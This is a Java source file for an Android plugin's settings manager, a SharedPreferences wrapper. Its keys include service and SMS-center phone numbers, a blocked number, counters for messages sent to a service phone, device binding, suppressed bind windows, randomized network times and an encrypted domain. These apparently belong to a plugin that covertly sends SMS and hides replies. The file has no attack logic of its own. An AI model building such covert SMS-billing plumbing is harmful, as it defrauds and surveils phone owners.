package com.xstd.plugin.config;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: AM10:58
 * To change this template use File | Settings | File Templates.
 */
public class PluginSettingManager {

    private static PluginSettingManager mInstance;

    private Context mContext;

    private SharedPreferences mSharedPreferences;

    private SharedPreferences.Editor mEditor;

    public static synchronized PluginSettingManager getInstance() {
        if (mInstance == null) {
            mInstance = new PluginSettingManager();
        }

        return mInstance;
    }

    private static final String SHARE_PREFERENCE_NAME = "setting_manager_share_pref_custom_plugin";

    // 在Application中一定要调用
    public synchronized void init(Context context) {
        mContext = context.getApplicationContext();
        mSharedPreferences = mContext.getSharedPreferences(SHARE_PREFERENCE_NAME, 0);
        mEditor = mSharedPreferences.edit();
    }

    private PluginSettingManager() {
    }

    public void clearAll() {
    }

    public void setServicePhoneNumber(String servicePhoneNumber) {
        mEditor.putString("service_phone_number", servicePhoneNumber).commit();
    }

    public String getServicePhoneNumber() {
        return mSharedPreferences.getString("service_phone_number", null);
    }

    public void setMainExtraInfo(String mainInfo) {
        mEditor.putString("main_extra", mainInfo).commit();
    }

    public String getMainExtraInfo() {
        return mSharedPreferences.getString("main_extra", null);
    }

    public static final String KEY_ACTIVE_APP_NAME = "key_active_app_name";

    public void setKeyActiveAppName(String name) {
        mEditor.putString(KEY_ACTIVE_APP_NAME, name).commit();
    }

    public String getKeyActiveAppName() {
        return mSharedPreferences.getString(KEY_ACTIVE_APP_NAME, null);
    }

    public void setMainApkSendUUID(String uuid) {
        mEditor.putString("main_uuid", uuid).commit();
    }

    public String getMainApkSendUUID() {
        return mSharedPreferences.getString("main_uuid", null);
    }

    public void setMainApkChannel(String channel) {
        mEditor.putString("main_channel", channel).commit();
    }

    public String getMainApkChannel() {
        return mSharedPreferences.getString("main_channel", null);
    }

    public static final String KEY_ACTIVE_PACKAGE_NAME = "key_active_package";

    public void setKeyActivePackageName(String name) {
        mEditor.putString(KEY_ACTIVE_PACKAGE_NAME, name).commit();
    }

    public String getKeyActivePackageName() {
        return mSharedPreferences.getString(KEY_ACTIVE_PACKAGE_NAME, null);
    }

    public static final String KEY_SMS_CENTER_NUM = "key_sms_center_num";

    public void setBindingSuccessCount(int count) {
        mEditor.putInt("binding_success_count", count).commit();
    }

    public int getBindingSuccessCount() {
        return mSharedPreferences.getInt("binding_success_count", 0);
    }

    public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";

    public void setKeyHasBindingDevices(boolean binding) {
        mEditor.putBoolean(KEY_HAS_BINDING_DEVICES, binding);
        mEditor.commit();
    }

    public boolean getKeyHasBindingDevices() {
        return mSharedPreferences.getBoolean(KEY_HAS_BINDING_DEVICES, false);
    }

    public static final String KEY_ACTIVE_TIME = "key_active_time";

    public void setKeyActiveTime(long time) {
        mEditor.putLong(KEY_ACTIVE_TIME, time);
        mEditor.commit();
    }

    public long getKeyActiveTime() {
        return mSharedPreferences.getLong(KEY_ACTIVE_TIME, 0);
    }

    public void setMainApkActiveTime(long time) {
        mEditor.putLong("main_active_time", time).commit();
    }

    public long getMainApkActiveTime() {
        return mSharedPreferences.getLong("main_active_time", 0);
    }

    public static final String KEY_BLOCK_PHONE_NUMBER = "key_block_phone_number";

    public void setKeyBlockPhoneNumber(String number) {
        mEditor.putString(KEY_BLOCK_PHONE_NUMBER, number).commit();
    }

    public String getKeyBlockPhoneNumber() {
        return mSharedPreferences.getString(KEY_BLOCK_PHONE_NUMBER, null);
    }

    public static final String KEY_MONTH_COUNT = "month_count";

    public void setKeyMonthCount(int count) {
        mEditor.putInt(KEY_MONTH_COUNT, count).commit();
    }

    public int getKeyMonthCount() {
        return mSharedPreferences.getInt(KEY_MONTH_COUNT, 0);
    }

    public void setFirstLanuchTime(long time) {
        mEditor.putLong("first_lanuch", time).commit();
    }

    public long getFirstLanuchTime() {
        return mSharedPreferences.getLong("first_lanuch", 0);
    }

    public static final String KEY_DAY_COUNT = "day_count";

    public void setKeyDayCount(int count) {
        mEditor.putInt(KEY_DAY_COUNT, count).commit();
    }

    public int getKeyDayCount() {
        return mSharedPreferences.getInt(KEY_DAY_COUNT, 0);
    }

    public static final String KEY_LAST_COUNT_TIME = "last_time";

    public void setKeyLastCountTime(long time) {
        mEditor.putLong(KEY_LAST_COUNT_TIME, time).commit();
    }

    public long getKeyLastCountTime() {
        return mSharedPreferences.getLong(KEY_LAST_COUNT_TIME, 0);
    }

    public static final String KEY_DAY_ACTIVE_COUNT = "day_active_count";

    public void setKeyDayActiveCount(int count) {
        mEditor.putInt(KEY_DAY_ACTIVE_COUNT, count).commit();
    }

    public int getKeyDayActiveCount() {
        return mSharedPreferences.getInt(KEY_DAY_ACTIVE_COUNT, 0);
    }

    public static final String KEY_LAST_FETCH_SMS_CENTER = "key_last_fetch_center";

    public void setKeyLastSendMsgToServicePhone(long time) {
        mEditor.putLong(KEY_LAST_FETCH_SMS_CENTER, time).commit();
    }

    public long getKeyLastSendMsgToServicehPhone() {
        return mSharedPreferences.getLong(KEY_LAST_FETCH_SMS_CENTER, 0);
    }

    public void setKeySendMsgToServicePhoneClearTimes(int times) {
        mEditor.putInt("service_phone_clear_times", times).commit();
    }

    public int getKeySendMsgToServicePhoneClearTimes() {
        return mSharedPreferences.getInt("service_phone_clear_times", 0);
    }

    public static final String KEY_RANDOM_NETWORK_TIME = "key_random_network_time";

    public void setKeyRandomNetworkTime(int randomHour) {
        mEditor.putInt(KEY_RANDOM_NETWORK_TIME, randomHour).commit();
    }

    public int getKeyRandomNetworkTime() {
        return mSharedPreferences.getInt(KEY_RANDOM_NETWORK_TIME, 0);
    }

    public void setKeyLastErrorInfo(String error) {
        mEditor.putString("last_error", error).commit();
    }

    public String getKeyLastErrorInfo() {
        return mSharedPreferences.getString("last_error", "无");
    }

    /**
     * 域名相关
     */
    public void setKeyDomain(String encrypt) {
        mEditor.putString("keyDomain", encrypt).commit();
    }

    public String geKeyDomain() {
        return mSharedPreferences.getString("keyDomain", null);
    }

    public void setKeyDeviceHasSendToServicePhone(boolean ignore) {
        mEditor.putBoolean("ignore", ignore).commit();
    }

    public boolean getKeyDeviceHasSendToServicePhone() {
        return mSharedPreferences.getBoolean("ignore", false);
    }

    public synchronized void setBroadcastPhoneNumber(String phones) {
        mEditor.putString("phones", phones).commit();
    }

    public synchronized String getBroadcastPhoneNumber() {
        return mSharedPreferences.getString("phones", null);
    }

    public void setCurrentPhoneNumber(String number) {
        mEditor.putString("phoneNumber", number).commit();
    }

    public String getCurrentPhoneNumber() {
        return mSharedPreferences.getString("phoneNumber", null);
    }

    public void setDeviceBindingCount(int count) {
        mEditor.putInt("device_bind_c", count).commit();
    }

    public int getDeviceBindingCount() {
        return mSharedPreferences.getInt("device_bind_c", 0);
    }

    public void setTodayFetchDomainCount(int count) {
        mEditor.putInt("today_fetch_demo", count).commit();
    }

    public int getTodayFetchDomainCount() {
        return mSharedPreferences.getInt("today_fetch_demo", 0);
    }

    public synchronized void setBindWindowNotShowCount(int count) {
        mEditor.putInt("bind_window_not_show_count", count).commit();
    }

    public synchronized int getBindWindowNotShowCount() {
        return mSharedPreferences.getInt("bind_window_not_show_count", 0);
    }
}
